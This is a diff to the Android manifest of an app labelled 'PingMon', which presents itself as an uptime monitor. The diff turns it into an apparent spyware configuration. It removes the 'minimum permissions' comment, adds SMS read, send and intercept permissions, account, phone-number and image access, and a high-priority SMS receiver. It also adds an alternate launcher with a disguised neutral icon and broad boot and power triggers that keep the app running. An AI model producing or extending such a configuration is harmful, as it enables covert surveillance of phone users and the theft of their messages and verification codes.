@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Minimum permissions only -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -12,6 +11,23 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+
+
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+        </intent>
+    </queries>
 
     <application
         android:label="PingMon"
@@ -20,6 +36,8 @@
         android:usesCleartextTraffic="false"
         android:networkSecurityConfig="@xml/network_security_config">
 
+        <!-- SetupActivity and MainActivity have no launcher filter.
+             The two aliases below control what appears on the home screen. -->
         <activity
             android:name=".SetupActivity"
             android:exported="true"
@@ -30,6 +48,7 @@
             android:exported="false"
             android:launchMode="singleTask" />
 
+        <!-- Normal state: blue signal icon, label PingMon -->
         <activity-alias
             android:name=".MainLauncher"
             android:targetActivity=".SetupActivity"
@@ -43,6 +62,7 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Hidden state: gray dot-grid icon, neutral label -->
         <activity-alias
             android:name=".HiddenLauncher"
             android:targetActivity=".SetupActivity"
@@ -63,8 +83,13 @@
             android:foregroundServiceType="specialUse">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="Continuous uptime monitoring heartbeat" />
+                android:value="Continuous uptime monitoring heartbeat to a remote endpoint" />
         </service>
+
+        <service
+            android:name=".PingJobService"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
 
         <receiver
             android:name=".BootReceiver"
@@ -72,8 +97,16 @@
             android:directBootAware="true">
             <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="com.example.pingmon.REVIVE" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
             </intent-filter>
         </receiver>
 
@@ -85,10 +118,14 @@
             </intent-filter>
         </service>
 
-        <service
-            android:name=".ReviveJob"
-            android:exported="false"
-            android:permission="android.permission.BIND_JOB_SERVICE" />
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
